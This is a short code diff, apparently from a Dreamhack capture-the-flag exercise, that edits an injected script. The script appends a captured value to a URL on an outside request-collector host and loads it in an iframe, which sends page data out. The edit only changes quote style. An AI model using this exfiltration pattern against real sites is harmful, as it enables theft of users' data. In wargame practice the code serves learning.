@@ -10,7 +10,7 @@
                   } catch (error) {
                       text = "NoNo"
                   }
-                  iframe.src = `https://mbfjcpx.request.dreamhack.games/` + text
+                  iframe.src = "https://mbfjcpx.request.dreamhack.games/" + text
                   document.body.append(iframe)
               }
           </script>
